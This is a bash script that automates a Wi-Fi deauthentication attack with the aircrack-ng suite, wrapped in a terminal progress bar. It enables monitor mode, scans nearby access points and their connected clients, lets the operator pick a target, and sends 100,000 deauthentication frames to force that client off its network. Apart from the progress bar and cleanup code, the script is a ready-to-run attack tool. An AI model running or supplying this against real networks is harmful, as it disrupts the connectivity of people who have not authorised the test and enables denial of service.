#!/usr/bin/env bash
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

### Progress-bar
progress_bar() {
  local current=$1
  local len=$2
  local bar_char=${4:-'|'}
  local bar_empty=${5:-' '}

  local perc_done=$((current * 100 / len))
  local -i width_terminal=$((COLUMNS - 2))
  local num_bars=$((perc_done * width_terminal / 100))

  local i
  local s='['
    for ((i = 0; i < num_bars; i++)); do s+=$bar_char; done
    for ((i = num_bars; i < width_terminal; i++)); do s+=$bar_empty; done
  s+=']'

  printf '\e7'                        # save the cursor location
  printf '\e[%d;1H' "$LINES"          # move cursor to the bottom
  printf '\e[0K'                      # clear the line
  printf '%s' "$s"                    # printf '%s' "$s ($perc_done%)"
  sleep .001
  printf '\e8'                        # restore the cursor location
}

### Init terminal
init_terminal() {
  (:)
  printf '\n'                         # ensure we have space for the scrollbar
  printf '\e7'                        # save the cursor location
  printf '\e[1;%dr' "$((LINES - 1))"  # set the scrollable region margin (1 to LINES-1)
  printf '\e8'                        # restore the cursor location
  printf '\e[1A'                      # move cursor up
}

### Clean terminal-screen on exit
cleanup_screen() {
  printf '\e[1;%dr' "$LINES"
  printf '\e[%d;1H' "$LINES"
  printf '\e[0K'
}

### Terminate airodump-ng PID on exit
terminate_pids() {
  cleanup_screen
  if [[ -n "$DUMP_PID" ]]; then
    kill "$DUMP_PID" 2>/dev/null
    wait "$DUMP_PID" 2>/dev/null
  fi
  if [[ -n "$PB_PID" ]]; then
    kill "$PB_PID" 2>/dev/null
    wait "$PB_PID" 2>/dev/null
  fi
  if [[ -n "$scan_routers_PID" ]]; then
    kill "$scan_routers_PID" 2>/dev/null
    wait "$scan_routers_PID" 2>/dev/null
  fi
  if [[ -n "$scan_clients_PID" ]]; then
    kill "$scan_clients_PID" 2>/dev/null
    wait "$scan_clients_PID" 2>/dev/null
  fi
  printf '\n[+] Exiting...\n'
  if [[ -n "${TRAP_SIGNAL:-}" ]]; then
    exit 130
  fi
}

### Start loading
loading() {
  declare -i len=500
  while true; do
    for (( i = 0; i < len+1; i++ )); do
       progress_bar "$((i+1))" "$len" 1 ">"
       ((i++))
    done
  done
}

### Echo
process_echo() {
  local line
  while IFS= read -r line; do
    printf '\e7'
    printf '\e[%d;1H' "$((LINES - 1))"
    printf '%s\n' "$line"
    printf '\e8'
  done
}

### Get options
get_opts() {
  while getopts 'r:c:t:' opt 2>/dev/null; do
    case "$opt" in
      r) mac="$OPTARG"
        ;;
      c) channel="$OPTARG"
        ;;
      t) client="$OPTARG"
        ;;
      ?) echo "Undefined option"
        exit
        ;;
    esac
  done
}

### Check if packages are installed
check_packages() {
  packages=("iw" "airodump-ng" "aireplay-ng" "airmon-ng")
  for p in "${packages[@]}"; do
    if ! command -v "${p}" &> /dev/null
    then
      echo "Package ${p} must be installed!"
      exit 1
    fi
  done
}

### Get the list of wifi interfaces
get_interfaces() {
  mapfile -t interfaces < <(iw dev | awk '$1=="Interface" {iface=$2} $1=="type" {print iface, $2}')
  if [[ ${#interfaces[@]} -eq 0 ]]
  then
    echo "No wireless interfaces available"
    exit 1
  fi
}

### Enable monitor mode
enable_monitor_mode() {
  interface=$(awk '{print $1}' <<< "${interfaces[0]}")
  type=$(awk '{print $2}' <<< "${interfaces[0]}")

  if [[  "${type}" == "monitor"  ]]; then
    echo "[+] Monitor mode is already enabled on interface: ${interface}"
    return
  fi

  ifconfig "${interface}" down > /dev/null &&
  airmon-ng check kill > /dev/null &&
  iw dev "${interface}" set type monitor > /dev/null &&
  ifconfig "${interface}" up > /dev/null
  echo "[+] Monitor mode enabled on interface: ${interface}"
}

### Scan routers
scan_routers() {
  shopt -s nullglob
  rm -f routers*

  airodump-ng --band a "$interface" --write routers --write-interval 1 >/dev/null &
  scan_routers_PID=$!

  echo "[+] Scanning network... (press any key to continue or wait 10s) PID: ${scan_routers_PID}" | process_echo
  read -r -t 10 -n 1 </dev/tty 2>/dev/null || true
  kill "$scan_routers_PID" 2>/dev/null
  wait "$scan_routers_PID" 2>/dev/null
  echo "[+] Scanning network DONE PID: ${scan_routers_PID}" | process_echo

  ### parsing SCV
  mapfile -t routers < <(
    sed -e '/^Station MAC/,$d' -e '/^BSSID/d' -e '/^$/d' -e 's/,/;/g' routers-01.csv |
    awk -F';' '{print $1, $4, $9, $(NF-1)}' |
    sed '/^[[:space:]]*$/d'
  )

  shopt -s nullglob
  rm -f routers*
}

### Select router
select_router() {
  PS3='Select network: '
  COLUMNS=1
  select r in "${routers[@]}"; do
    router="${r}"
    break
  done
  printf '\n'
}

### Scan clients on selected router
scan_router_clients() {
  shopt -s nullglob
  rm -f clients-*

  airodump-ng --bssid "$mac" --channel "$channel" --write clients --write-interval 1 >/dev/null "wlan0" &
  scan_clients_PID=$!

  echo "[+] Scanning for clients on network '$mac $name'...(press any key to continue or wait 15s)' PID: ${scan_clients_PID}" | process_echo
  read -r -t 15 -n 1 </dev/tty 2>/dev/null || true
  kill "$scan_clients_PID" 2>/dev/null
  wait "$scan_clients_PID" 2>/dev/null
  echo "[+] Scanning clients DONE PID: ${scan_clients_PID}" | process_echo

  ### parsing SCV
  mapfile -t clients < <(
   sed -e '1,/^Station MAC/d' -e 's/,/;/g' clients-01.csv |
   awk -F';' '{print $1}' | 
   sed '/^[[:space:]]*$/d'
  )

  shopt -s nullglob
  rm -f clients-*
}

### Select router client
select_router_client() {
  PS3='Select client to disconect from network: '
  COLUMNS=1
  select c in "${clients[@]}"; do
    client="${c}"
    break
  done
}

### Main function
main() {
  trap 'TRAP_SIGNAL=1; terminate_pids' SIGINT SIGTERM
  trap terminate_pids EXIT

  ### check
  check_packages
  get_interfaces
  enable_monitor_mode

  ### scan network routers
  if [[ -z "$mac" || -z "$channel" ]]; then
    init_terminal
    loading &
    PB_PID=$!
    scan_routers
    kill "$PB_PID" 2>/dev/null
    wait "$PB_PID" 2>/dev/null
    cleanup_screen
    select_router
    read -r mac channel _ name <<< "${router}"
  fi

  ### scan clients on network
  if [[ -z "$client" ]]; 
  then
    init_terminal
    loading &
    PB_PID=$!
    scan_router_clients
    kill "$PB_PID" 2>/dev/null
    wait "$PB_PID" 2>/dev/null
    cleanup_screen
    select_router_client
  fi
 
  ### Disconect client
  airodump-ng --band a --bssid "$mac" --channel "$channel" "$interface" 1> /dev/null &
  DUMP_PID=$!
  echo; echo; 
  aireplay-ng --deauth 100000 -a "$mac" -c "$client" -D "$interface" 2>&1 | tr '\n' '\r'
}

if [[ $# -gt 0 ]]; 
then 
  get_opts "$@" 
fi
main